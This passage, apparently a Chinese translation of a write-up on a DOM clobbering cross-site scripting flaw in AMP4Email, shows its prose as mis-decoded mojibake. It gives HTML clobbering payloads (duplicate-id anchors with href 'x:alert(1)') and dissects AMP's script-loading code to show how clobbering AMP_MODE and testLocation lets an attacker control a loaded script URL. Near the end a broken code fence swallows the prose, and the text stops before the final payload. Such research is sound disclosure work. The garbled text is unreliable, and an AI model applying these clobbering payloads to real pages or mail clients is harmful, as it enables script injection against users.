<p>ä¸ºäº†è§£å†³ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘åˆ›å»ºäº†ä¸€ä¸ªç®€çŸ­çš„ JS ä»£ç ï¼Œè¯¥ä»£ç å¯¹ HTML ä¸­æ‰€æœ‰å¯èƒ½çš„å…ƒç´ è¿›è¡Œäº†è¿­ä»£ï¼Œå¹¶æ£€æŸ¥å®ƒä»¬çš„ <code>toString</code> æ–¹æ³•æ˜¯å¦ç»§æ‰¿è‡ª <code>Object.prototype</code> è¿˜æ˜¯ä»¥å…¶ä»–æ–¹å¼å®šä¹‰çš„ã€‚å¦‚æœå®ƒä»¬ä¸ç»§æ‰¿è‡ª<code>Object.prototype</code>ï¼Œåˆ™å¯èƒ½ä¼šè¿”å›é™¤ <code>[object SomeElement]</code> å¤–çš„å…¶ä»–å†…å®¹ã€‚</p>

<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">Object.<span style="color:#a6e22e">getOwnPropertyNames</span>(window)
.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/Element$/</span>))
.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">p</span> =&gt; window[<span style="color:#a6e22e">p</span>])
.<span style="color:#a6e22e">filter</span>(<span style="color:#a6e22e">p</span> =&gt; <span style="color:#a6e22e">p</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">prototype</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">!==</span> Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">toString</span>)
</code></pre></div>
<p>è¯¥ä»£ç è¿”å›ä¸¤ä¸ªå…ƒç´ ï¼š<code>HTMLAreaElement</code>ï¼ˆ<code>&lt;area&gt;</code>ï¼‰å’Œ <code>HTMLAnchorElement</code>ï¼ˆ<code>&lt;a&gt;</code>ï¼‰ã€‚ AMP4Email ä¸­ä¸å…è®¸ä½¿ç”¨ç¬¬ä¸€ä¸ªï¼Œå› æ­¤ä»…å…³æ³¨ç¬¬äºŒä¸ªã€‚å¦‚æœæ˜¯ <code>&lt;a&gt;</code> å…ƒç´ ï¼Œåˆ™ <code>toString</code> ä»…è¿”å› <code>href</code> å±æ€§çš„å€¼ã€‚è€ƒè™‘ç¤ºä¾‹ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">https://securitum.com</span>&gt;
&lt;<span style="color:#f92672">script</span>&gt;
  <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">test1</span>); <span style="color:#75715e">// alerts &#34;https://securitum.com&#34;
</span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;</code></pre></div>
<p>åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œä¼¼ä¹æˆ‘ä»¬æƒ³è§£å†³æœ€åˆçš„é—®é¢˜ï¼ˆæ¯”å¦‚é€šè¿‡ DOM Clobbering è·å– <code>window.test1.test2</code> çš„å€¼ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ç±»ä¼¼äºä»¥ä¸‹ä»£ç ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;
  &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x:alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
&lt;/<span style="color:#f92672">form</span>&gt;</code></pre></div>
<p>é—®é¢˜åœ¨äºå®ƒæ ¹æœ¬ä¸èµ·ä½œç”¨ï¼›<code>test1.test2</code> å°†ä¼šæ˜¯ <code>undefined</code>ã€‚ å°½ç®¡ <code>&lt;input&gt;</code> å…ƒç´ ç¡®å®æˆä¸ºäº† <code>&lt;form&gt;</code> çš„å±æ€§ï¼Œä½† <code>&lt;a&gt;</code> æ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚</p>

<p>è¿™ä¸ªé—®é¢˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„è§£å†³æ–¹æ³•ï¼Œä¸è¿‡ä»…ä»…é€‚ç”¨äºåŸºäº WebKit ä»¥åŠ Blink å†…æ ¸çš„æµè§ˆå™¨ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªå…·æœ‰ç›¸åŒ id çš„å…ƒç´ ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click!&lt;/<span style="color:#f92672">a</span>&gt;
&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click2!&lt;/<span style="color:#f92672">a</span>&gt;</code></pre></div>
<p>é‚£ä¹ˆè®¿é—® <code>window.test1</code> æ—¶æˆ‘ä»¬å°†å¾—åˆ°ä»€ä¹ˆï¼Ÿæˆ‘ç›´è§‰ä¸Šå¸Œæœ›å¾—åˆ°å…·æœ‰è¯¥ id çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå½“ä½ å°è¯•è°ƒç”¨<code>document.getElementById('#test1')</code> æ—¶ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚ä½†æ˜¯ï¼Œåœ¨ Chromium ä¸­ï¼Œæˆ‘ä»¬å®é™…ä¸Šå¾—åˆ°äº†ä¸€ä¸ª<code>HTMLCollection</code>ï¼</p>

<p><img src="https://s2.ax1x.com/2019/11/18/McKGoq.png" alt="McKGoq.png" />
å›¾4. window.test1 æŒ‡å‘ HTMLCollection</p>

<p>è¿™é‡Œç‰¹åˆ«æœ‰è¶£çš„æ˜¯ï¼ˆå¯ä»¥åœ¨å›¾4ä¸­çœ‹åˆ°ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç´¢å¼•ï¼ˆç¤ºä¾‹ä¸­çš„0å’Œ1ï¼‰ä»¥åŠé€šè¿‡ id è®¿é—®è¯¥ HTMLCollection ä¸­çš„ç‰¹å®šå…ƒç´ ã€‚ è¿™æ„å‘³ç€ <code>window.test1.test1</code> å®é™…ä¸Šæ˜¯æŒ‡ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ äº‹å®è¯æ˜ï¼Œè®¾ç½® <code>name</code> å±æ€§ä¹Ÿä¼šåœ¨ <code>HTMLCollection</code> ä¸­åˆ›å»ºæ–°å±æ€§ã€‚ æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰ä»¥ä¸‹ä»£ç ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;click!&lt;/<span style="color:#f92672">a</span>&gt;
&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span>&gt;click2!&lt;/<span style="color:#f92672">a</span>&gt;</code></pre></div>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>window.test1.test2</code> è®¿é—®ç¬¬äºŒä¸ªé”šå…ƒç´ ã€‚</p>

<p><img src="https://s2.ax1x.com/2019/11/19/Mc53RA.png" alt="Mc53RA.png" />
å›¾5. æˆ‘ä»¬å¯ä»¥å®šä¹‰ window.test1.test2</p>

<p>å› æ­¤ï¼Œå›åˆ°é€šè¿‡ DOM Clobbering åˆ©ç”¨ <code>eval(''+ window.test1.test2)</code> çš„åŸå§‹ç»ƒä¹ ï¼Œè§£å†³æ–¹æ¡ˆæ˜¯ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test1&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test1&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test2&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x:alert(1)&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;</code></pre></div>
<p>ç°åœ¨è®©æˆ‘ä»¬å›åˆ° AMP4Emailï¼Œçœ‹çœ‹å¦‚ä½•åœ¨å®é™…æƒ…å†µä¸‹å¦‚ä½•åˆ©ç”¨ DOM Clobberingã€‚</p>

<h2 id="åœ¨-amp4email-åˆ©ç”¨-dom-clobbering">åœ¨ AMP4Email åˆ©ç”¨ DOM Clobbering</h2>

<p>æˆ‘å·²ç»æåˆ°è¿‡ï¼Œé€šè¿‡å‘å…ƒç´ æ·»åŠ æˆ‘è‡ªå·±çš„ id å±æ€§ï¼ŒAMP4Email å¯èƒ½å®¹æ˜“å—åˆ° DOM Clobbering çš„æ”»å‡»ã€‚ä¸ºäº†æ‰¾åˆ°å¯åˆ©ç”¨çš„æ¡ä»¶ï¼Œæˆ‘å†³å®šçœ‹ä¸€ä¸‹ <code>window</code> çš„å±æ€§ï¼ˆå›¾6ï¼‰ã€‚ç«‹å³å¼•èµ·æ³¨æ„çš„æ˜¯å¼€å¤´çš„ AMPã€‚</p>

<p><img src="https://s2.ax1x.com/2019/11/19/Mc5DRs.png" alt="Mc5DRs.png" />
å›¾6. window å…¨å±€å¯¹è±¡çš„å±æ€§</p>

<p>åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œäº‹å®è¯æ˜ AMP4Email å®é™…ä¸Šå¯¹ DOM Clobbering é‡‡å–äº†æŸç§ä¿æŠ¤æªæ–½ï¼Œå› ä¸ºå®ƒä¸¥æ ¼ç¦æ­¢ id å±æ€§çš„æŸäº›å€¼ï¼Œä¾‹å¦‚ï¼š<code>AMP</code>ï¼ˆå›¾7ï¼‰ã€‚</p>

<p><img src="https://s1.ax1x.com/2019/11/19/MRVc2F.png" alt="MRVc2F.png" />
å›¾7. AMP æ˜¯ AMP4Email ä¸­çš„ id çš„æ— æ•ˆå€¼</p>

<p>ä½†æ˜¯ï¼ŒAMP_MODEå¹¶æ²¡æœ‰å‘ç”Ÿç›¸åŒçš„é™åˆ¶ã€‚æ‰€ä»¥æˆ‘å‡†å¤‡äº†ä¸€å¥ä»£ç  <code>&lt;a id=AMP_MODE&gt;</code> çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆâ€¦â€¦</p>

<p>â€¦ç„¶åæˆ‘æ³¨æ„åˆ°æ§åˆ¶å°ä¸­æœ‰ä¸€ä¸ªéå¸¸æœ‰è¶£çš„é”™è¯¯ï¼ˆå›¾8ï¼‰ã€‚</p>

<p><img src="https://s2.ax1x.com/2019/11/19/Mc5WoF.png" alt="Mc5WoF.png" />
å›¾8. åŠ è½½æŸäº›JSæ–‡ä»¶çš„ 404 é”™è¯¯</p>

<p>å¦‚å›¾8 æ‰€ç¤ºï¼ŒAMP4Email å°è¯•åŠ è½½æŸäº›JSæ–‡ä»¶ï¼Œä½†ç”±äº 404 è€Œæœªèƒ½åŠ è½½ã€‚ä½†æ˜¯ï¼Œç‰¹åˆ«å¼•äººæ³¨ç›®çš„æ˜¯ï¼ŒURL ï¼ˆ<a href="https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.jsï¼‰ä¸­å­˜åœ¨">https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.jsï¼‰ä¸­å­˜åœ¨</a> <code>undefined</code>ã€‚æˆ‘èƒ½å¤Ÿæƒ³å‡ºçš„å”¯ä¸€ä¸€ä¸ªåˆç†çš„è§£é‡Šï¼šAMP å°è¯•è·å– <code>AMP_MODE</code> çš„å±æ€§ä»¥å°†å…¶æ”¾å…¥URLã€‚ç”±äº DOM Clobberingï¼Œç¼ºå°‘äº†é¢„æœŸçš„å±æ€§ï¼Œå› æ­¤æ˜¯ <code>undefined</code>ã€‚åŒ…å«ä»£ç çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">preloadExtension</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) {
            <span style="color:#e6db74">&#34;amp-embed&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amp-ad&#34;</span>);
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fn</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">a</span>, <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>);
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">loaded</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">error</span>)
                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>;
            <span style="color:#66d9ef">else</span>
                <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;[custom-element=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;]&#39;</span>),
                <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span><span style="color:#a6e22e">d</span>),
                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span>;
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">d</span>) {
                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>;
                <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
                <span style="color:#a6e22e">b</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>;
                <span style="color:#a6e22e">yb</span>(<span style="color:#a6e22e">a</span>, <span style="color:#e6db74">&#34;_&#34;</span>) <span style="color:#f92672">?</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">dn</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#a6e22e">a</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;custom-template&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;custom-element&#34;</span>, <span style="color:#a6e22e">a</span>);
                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;data-script&#34;</span>, <span style="color:#a6e22e">a</span>);
                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;i-amphtml-inserted&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">location</span>;
                <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">test</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">testLocation</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">testLocation</span>);
                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">localDev</span>) {
                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">host</span>;
                    <span style="color:#e6db74">&#34;about:&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>);
                    <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist&#34;</span>
                } <span style="color:#66d9ef">else</span>
                    <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hd</span>.<span style="color:#a6e22e">cdn</span>;
                <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">rtvVersion</span>;
                <span style="color:#66d9ef">null</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0.1&#34;</span>);
                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rtv/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
                <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>
            }
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gn</span>(<span style="color:#a6e22e">c</span>)
        }
</code></pre></div>
<p>å°½ç®¡é˜…è¯»èµ·æ¥ä¸æ˜¯ç‰¹åˆ«å›°éš¾ï¼Œä½†ä¸‹é¢æ˜¯æ‰‹åŠ¨å»æ··æ·†çš„ä»£ç ï¼ˆä¸ºäº†æ›´æ¸…æ™°ï¼Œçœç•¥äº†æŸäº›éƒ¨åˆ†ï¼‰ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> window.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
<span style="color:#a6e22e">script</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
 
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loc</span>;
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">test</span> <span style="color:#f92672">&amp;&amp;</span> window.<span style="color:#a6e22e">testLocation</span>) {
    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">testLocation</span>
} <span style="color:#66d9ef">else</span> {
    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>;
}
 
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">localDev</span>) {
    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loc</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">loc</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist&#34;</span>
} <span style="color:#66d9ef">else</span> {
    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://cdn.ampproject.org&#34;</span>;
}
 
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">singlePass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loc</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rtv/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">rtvVersion</span>; <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">singlePass</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">pluginName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
 
document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
</code></pre></div>
<p>å› æ­¤ï¼Œåœ¨ç¬¬1è¡Œä¸­ï¼Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ <code>script</code> å…ƒç´ ã€‚ç„¶åï¼Œæ£€æŸ¥ <code>AMP_MODE.test</code> å’Œ <code>window.testLocation</code> æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œå¹¶ä¸” AMP_MODE.localDev ä¸ºçœŸï¼ˆç¬¬11è¡Œï¼‰ï¼Œåˆ™å°†<code>window.testLocation</code> ä½œä¸ºç”Ÿæˆè„šæœ¬URLçš„åŸºç¡€ã€‚ç„¶åï¼Œåœ¨ç¬¬17å’Œ18è¡Œä¸­ï¼Œå°†å…¶ä»–ä¸€äº›å±æ€§è¿æ¥èµ·æ¥ä»¥å½¢æˆå®Œæ•´çš„URLã€‚è™½ç„¶ä¹ä¸€çœ‹å¯èƒ½å¹¶ä¸æ˜æ˜¾ï¼Œä½†æ˜¯ç”±äºä»£ç çš„ç¼–å†™æ–¹å¼ä»¥åŠ DOM Clobberingï¼Œæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥æ§åˆ¶å®Œæ•´çš„URLã€‚è®©æˆ‘ä»¬å‡è®¾ <code>AMP_MODE.localDev</code> å’Œ <code>AMP_MODE.test</code> ä¸ºçœŸï¼Œä»£ç ä¼šè¿›ä¸€æ­¥ç®€åŒ–ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> window.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
<span style="color:#a6e22e">script</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
 
<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">testLocation</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> 
        window.<span style="color:#a6e22e">testLocation</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist/rtv/&#34;</span> <span style="color:#f92672">+</span> 
        <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">rtvVersion</span>; <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> 
        (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> 
        <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">pluginName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
 
document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
<span style="color:#e6db74">````</span>

<span style="color:#a6e22e">ä½ è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰é€šè¿‡</span> <span style="color:#a6e22e">DOM</span> <span style="color:#a6e22e">Clobbering</span> <span style="color:#a6e22e">é‡è½½</span> <span style="color:#e6db74">`window.test1.test2`</span> <span style="color:#a6e22e">çš„ç»ƒä¹ å—</span><span style="color:#960050;background-color:#1e0010">ï¼Ÿ</span><span style="color:#a6e22e">ç°åœ¨æˆ‘ä»¬éœ€è¦åšåŒæ ·çš„äº‹æƒ…</span><span style="color:#960050;background-color:#1e0010">ï¼Œ</span><span style="color:#a6e22e">åªè¦é‡è½½</span> <span style="color:#e6db74">`window.testLocation.protocol`</span><span style="color:#960050;background-color:#1e0010">ã€‚</span><span style="color:#a6e22e">å› æ­¤</span><span style="color:#960050;background-color:#1e0010">ï¼Œ</span><span style="color:#a6e22e">æœ€ç»ˆçš„æœ‰æ•ˆè½½è·</span><span style="color:#960050;background-color:#1e0010">ï¼š</span>

<span style="color:#e6db74">```html
